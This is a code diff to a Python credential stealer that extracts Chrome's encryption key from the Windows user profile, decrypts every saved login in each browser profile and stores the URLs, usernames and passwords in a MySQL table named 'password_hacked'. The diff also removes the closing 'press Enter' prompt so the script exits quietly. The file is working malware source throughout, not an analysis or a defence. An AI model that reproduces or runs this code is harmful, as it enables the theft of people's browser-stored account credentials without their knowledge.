@@ -9,6 +9,8 @@ import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
 import csv
+import mysql.connector
+import mysql.connector.plugins.caching_sha2_password
 
 #GLOBAL CONSTANT
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
@@ -62,7 +64,44 @@ def get_db_connection(chrome_path_login_db):
         print("%s"%str(e))
         print("[ERR] Chrome database cannot be found")
         return None
-        
+
+def connect_to_mysql():
+    try:
+        mydb = mysql.connector.connect(
+                host='localhost',
+                user="root",
+                password="root",
+                database="password_hacked"
+                )
+        return mydb
+    except Exception as e:
+        print("%s"%str(e))
+        print("[ERR] Cannot connect to MySQL database")
+        return None
+
+def create_table_if_not_exist(conn):
+    try:
+        mycursor = conn.cursor()
+        mycursor.execute("CREATE TABLE IF NOT EXISTS password_hacked (id INT AUTO_INCREMENT PRIMARY KEY, url VARCHAR(255), username VARCHAR(255), password VARCHAR(255))")
+        return
+    except Exception as e:
+        print("%s"%str(e))
+        print("[ERR] Cannot create table in MySQL database")
+        return    
+
+def save_data_to_my_sql(conn, url, username, password):
+    try:
+        mycursor = conn.cursor()
+        sql = "INSERT INTO password_hacked (url, username, password) VALUES (%s, %s, %s)"
+        val = (url, username, password)
+        mycursor.execute(sql, val)
+        conn.commit()
+        return
+    except Exception as e:
+        print("%s"%str(e))
+        print("[ERR] Cannot save data to MySQL database")
+        return   
+    
 if __name__ == '__main__':
     try:
         #Create Dataframe to store passwords
@@ -72,6 +111,8 @@ if __name__ == '__main__':
             #(1) Get secret key
             secret_key = get_secret_key()
             #Search user profile or default folder (this is where the encrypted login password is stored)
+            mysql_db = connect_to_mysql()
+            create_table_if_not_exist(mysql_db)
             folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
             for folder in folders:
             	#(2) Get ciphertext from sqlite database
@@ -92,14 +133,15 @@ if __name__ == '__main__':
                             print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                             print("*"*50)
                             #(5) Save into CSV 
-                            csv_writer.writerow([index,url,username,decrypted_password])
+                            save_data_to_my_sql(mysql_db, url, username, decrypted_password)
+                            # csv_writer.writerow([index,url,username,decrypted_password])
                     #Close database connection
                     cursor.close()
                     conn.close()
                     #Delete temp login db
                     os.remove("Loginvault.db")
 
-            print("Application executed successfully. Press Enter to exit...")
-            input()
+            # print("Application executed successfully. Press Enter to exit...")
+            # input()
     except Exception as e:
         print("[ERR] %s"%str(e))
